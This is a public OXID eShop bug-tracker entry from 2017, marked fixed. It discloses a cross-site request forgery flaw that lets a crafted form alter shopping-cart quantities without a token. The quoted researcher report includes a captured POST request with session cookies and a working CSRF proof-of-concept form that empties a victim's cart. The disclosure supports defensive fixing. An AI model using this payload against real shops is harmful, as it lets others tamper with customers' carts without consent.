=== Content from bugs.oxid-esales.com_bfe943ca_20250124_222422.html ===


Toggle sidebar [OXID eShop bugtrack](/main_page.php) Toggle user menu

* OXID eShop (all versions)

  + - [All Projects](/set_project.php?project_id=0)
    - [Apex Theme](/set_project.php?project_id=63)
    - [Flow theme](/set_project.php?project_id=40)
    - [module Adyen](/set_project.php?project_id=61)
    - [module Amazon Pay](/set_project.php?project_id=59)
    - [module Country VAT](/set_project.php?project_id=65)
    - [module Easy Credit](/set_project.php?project_id=68)
    - [module eVAT](/set_project.php?project_id=34)
    - [module Free Shipping Coupons](/set_project.php?project_id=71)
    - [module GDPR Base](/set_project.php?project_id=44)
    - [module GDPR Opt-in](/set_project.php?project_id=43)
    - [module Geo-Blocking](/set_project.php?project_id=64)
    - [module GraphQL](/set_project.php?project_id=55)
    - [GraphQL Base](/set_project.php?project_id=55;56)
    - [GraphQL Configuration Access](/set_project.php?project_id=55;67)
    - [GraphQL Storefront](/set_project.php?project_id=55;57)
    - [GraphQL Storefront Administration](/set_project.php?project_id=55;72)
    - [module Media library](/set_project.php?project_id=69)
    - [module OXID Analytics powered by Econda](/set_project.php?project_id=47)
    - [module OXID NGINX ReverseProxy](/set_project.php?project_id=52)
    - [module OXID Personalization powered by Econda](/set_project.php?project_id=46)
    - [module OXID Varnish ReverseProxy](/set_project.php?project_id=51)
    - [module PayPal](/set_project.php?project_id=14)
    - [module PayPal Checkout](/set_project.php?project_id=58)
    - [module Security](/set_project.php?project_id=70)
    - [module Stripe](/set_project.php?project_id=66)
    - [module Unzer](/set_project.php?project_id=60)
    - [module Usercentrics](/set_project.php?project_id=53)
    - [module Visual CMS](/set_project.php?project_id=41)
    - [OXID B2B ERP Interface](/set_project.php?project_id=45)
    - [OXID ERP Interface](/set_project.php?project_id=4)
    - [OXID eShop (all versions)](/set_project.php?project_id=1)
    - [OXID eShop B2B Edition](/set_project.php?project_id=39)
    - [Wave theme](/set_project.php?project_id=48)
    - [WYSIWYG Editor + Media Gallery](/set_project.php?project_id=42)
* user
  + [RSS](https://bugs.oxid-esales.com/issues_rss.php)
  + [Logout](/logout_page.php)

* [My View](/my_view_page.php)
* [View Issues](/view_all_bug_page.php)
* [Change Log](/changelog_page.php)
* [Roadmap](/roadmap_page.php)

* Anonymous
[Login](/login_page.php?return=%2Fview.php%3Fid%3D6674)
[Signup for a new account](/signup_page.php)

#### View Issue Details

[Jump to Notes](#bugnotes)

|  | | | | | |
| --- | --- | --- | --- | --- | --- |
| ID | Project | Category | View Status | Date Submitted | Last Update |
| --- | --- | --- | --- | --- | --- |
| 0006674 | OXID eShop (all versions) | 4.04. Security | public | 2017-08-02 13:05 | 2017-08-18 15:39 |
|  | | | | | |
|
| Reporter | [marco\_steinhaeuser](https://bugs.oxid-esales.com/view_user_page.php?id=32) | Assigned To |  |  | |
| Priority | normal | Severity | minor | Reproducibility | always |
| Status | resolved | Resolution | fixed |  | |
| Product Version | 4.10.5 / 5.3.5 |  | | | |
| Target Version | 4.10.6 / 5.3.6 | Fixed in Version | 4.9.10 / 5.2.10 |  | |
|  | | | | | |
|
| Summary | 0006674: OXID potential CSFR bug | | | | |
| Description | Oxid Security Team,    We received a report of a CSRF bug on our site `[domain.com]`.  The jist is that a carefully crafted form can adjust cart item counts without a valid stoken or csrf protection mechanism. This is admittedly minor, but represents a valid security problem.  This could admittedly be a known issue that could be solved by updates, but we would like to confirm that this problem is known about and has been addressed.  -Daryl iFixit Security Team    PS: Please find the original report included:  ------------------------------------------------------------------  1. CSRF on the EU Store: I just need "aid" which is always same for victim as well suppose if the somehow i came to know that the product name which is in cart then i easily get aid value by searching the product and intercepting my own request and used in my CSRF code.  here is the POST request for the product that i want to search to find "aid"   POST /index.php?lang=1& HTTP/1.1 Host: [domain.com] User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 316 Referer: https://[domain.com]/index.php?cl=details&cnid=699a66f8a4ded03b5795313fdf6281fa&anid=04832587843313ab35bf29aaab5f2ab3&listtype=search&searchparam=iphone&&lang=1 Cookie: \_ga=GA1.2.532387267.1494626478; session=2b0d5cf9090fc367f6ce8753e4d4edf1; settingsc=current\_page%3D%252FUser%252Feu\_sso%3A%3Alast\_page%3D%252FGuide%252FUser%252Fdozuki\_sso; \_\_utmx=120539472.yt3Er6fYT5-YKEiDeCa0zQ$0:0; \_\_utmxx=120539472.yt3Er6fYT5-YKEiDeCa0zQ$0:1494630243:8035200; \_gid=GA1.2.120962297.1497571472; \_ceg.s=ormp2a; \_ceg.u=ormp2a; language=1; sid=1f446ae471b83173539929786a3ed2a3; sid\_key=oxid Connection: keep-alive Upgrade-Insecure-Requests: 1  stoken=3614313A&lang=1&cnid=699a66f8a4ded03b5795313fdf6281fa&listtype=search&actcontrol=details&searchparam=iphone&cl=details&aid=04832587843313ab35bf29aaab5f2ab3&anid=04832587843313ab35bf29aaab5f2ab3&parentid=0482063b7baac91cda48cf68bb0c660d&panid=&fnc=tobasket&varselid%5B0%5D=e90dfb84e30edf611e326eeb04d680de&am=1  in this i only need aid that is same for victim as well. i only need to change the aid in my csrf code. and no need of any token. and now am gonna send this file to victim. and his/her cart got empty  here is the CSRF code for that <html>   <!-- CSRF PoC -->   <body>     <form action="https://[domain.com]/index.php">       <input type="hidden" name="lang" value="1" />       <input type="hidden" name="cl" value="basket" />       <input type="hidden" name="fnc" value="changebasket" />       <input type="hidden" name="override" value="1" />       <input type="hidden" name="aid" value="04832587843313ab35bf29aaab5f2ab3" />        <input type="hidden" name="am" value="0" />       <input type="submit" value="Submit request" />     </form>   </body> </html> | | | | |
| Tags | No tags attached. | | | | |
|  | | | | | |
|
| Theme | Not defined | | | | |
| Browser | Not defined | | | | |
| PHP Version | Not defined | | | | |
| Database Version | Not defined | | | | |
|  | | | | | |
|

#### Activities

| There are no notes attached to this issue. | |
| --- | --- |

Copyright © 2000 - 2025 OXID eSales AG | [Legal information](https://www.oxid-esales.com/impressum/) | [Privacy Policy](https://www.oxid-esales.com/datenschutz/)
Contact [administrator](/cdn-cgi/l/email-protection#6d0c090004032d0215040940081e0c01081e430e0200 "Contact the webmaster via e-mail.") for assistance

[![Powered by Mantis Bug Tracker: a free and open source web based bug tracking system.](/images/mantis_logo.png)](https://www.oxidforge.org "Mantis Bug Tracker: a free and open source web based bug tracking system.")


